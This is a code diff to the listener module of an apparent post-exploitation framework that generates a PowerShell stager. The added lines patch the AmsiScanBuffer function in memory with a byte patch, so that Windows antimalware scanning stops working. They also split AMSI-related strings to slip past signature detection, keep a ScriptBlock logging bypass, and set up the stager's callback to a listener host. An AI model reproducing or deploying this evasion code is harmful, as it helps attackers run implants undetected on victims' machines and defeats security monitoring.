@@ -113,7 +113,37 @@ class Listener:
 
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
-                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+                    #
+                    # Disable Antimalware Scan Interface
+                    #
+                    stager = '$Win32 = @"\n'
+                    stager += 'using System;\n'
+                    stager += 'using System.Runtime.InteropServices;\n'
+
+                    stager += 'public class Win32 {\n'
+
+                    stager += '    [DllImport("kernel32")]\n'
+                    stager += '    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n'
+
+                    stager += '    [DllImport("kernel32")]\n'
+                    stager += '    public static extern IntPtr LoadLibrary(string name);\n'
+
+                    stager += '    [DllImport("kernel32")]\n'
+                    stager += '    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n'
+
+                    stager += '}\n'
+                    stager += '"@\n'
+
+                    stager += 'Add-Type $Win32;\n'
+	
+                    stager += '$LoadLibrary = [Win32]::LoadLibrary("amsi.dll");\n'
+                    stager += '$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer");\n'
+                    stager += '$p = 0;\n'
+                    stager += '[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);\n'
+                    stager += '$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);\n'
+                    stager += '[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6);\n'
+		
+                    stager += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
                     stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
@@ -132,9 +162,9 @@ class Listener:
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
+                    stager += "'System.Management.Automation.Am' + 'siUtils'"
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
+                    stager += "'am' + 'siInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
@@ -204,7 +234,8 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser='%s';$t='%s';$hop='%s';" % (host, stage0, listenerName)
+
                 #Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
